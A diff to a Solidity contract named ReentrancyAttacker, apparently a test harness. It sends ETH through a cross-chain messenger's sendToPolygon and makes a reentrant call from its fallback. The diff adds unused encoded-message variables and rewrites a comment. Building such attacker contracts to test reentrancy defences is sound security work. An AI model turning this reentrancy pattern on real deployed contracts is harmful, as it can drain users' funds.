@@ -18,6 +18,8 @@ contract ReentrancyAttacker {
     function attack() external payable {
         require(msg.value >= 1 ether, "Need at least 1 ETH");
         attackCount = 0;
+        // Encode the amount as bytes for the cross-chain message
+        bytes memory messageData = abi.encode(1 ether);
         messenger.sendToPolygon{value: 1 ether}(address(this));
         emit AttackAttempted(msg.value, 0);
     }
@@ -26,7 +28,8 @@ contract ReentrancyAttacker {
         emit FallbackCalled(msg.value);
 
         if (attackCount == 0 && address(this).balance >= 1 ether) {
-            // Attempt reentrant call before state changes
+            // Encode the amount for the reentrant attempt
+            bytes memory messageData = abi.encode(1 ether);
             messenger.sendToPolygon{value: 1 ether}(address(this));
             attackCount++;
             emit AttackAttempted(1 ether, attackCount);
